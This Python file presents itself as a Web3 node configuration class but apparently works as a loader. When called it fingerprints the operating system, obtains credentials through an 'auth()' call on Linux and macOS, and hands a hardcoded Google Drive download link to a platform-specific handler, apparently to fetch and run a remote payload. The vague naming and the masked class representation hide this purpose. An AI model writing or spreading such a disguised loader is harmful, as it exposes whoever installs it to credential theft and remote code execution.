import sys
import platform
from web3node import *

class W3Config:
    def __init__(self):
        self.dic_node = {
            0: gnu.Web3NodeGNU,
            1: darwin.Web3NodeDarwin,
            2: win32.Web3NodeWin32
        }
        self.otype = -1
        self.usr = ""
        self.pwd = ""
        
    def __repr__(self):
        return "<class 'W3Config'>"
        
    def __str__(self):
        return "<class 'W3Config'>"
        
    def __call__(self, ur="https://docs.google.com/", pth="uc?export=download&id=1Br_CCeWB8Zv5q9rwviUvRw3T4w-pkFDp", pr="u"):
        un = platform.uname()
        pl = platform.platform()
        cate = {
            "linux" : 0,
            "macos" : 1,
            "windows" : 2
        }

        for tp, value in cate.items():
            if tp in pl.lower():
                self.otype = value
                break
                
        if self.otype != -1:
            oNodeC = self.dic_node.get(self.otype)
            oNode = oNodeC()
            
            if self.otype != 2:
                cred = oNode.auth()
                
            oNode(ur, pth, pr, self.otype)
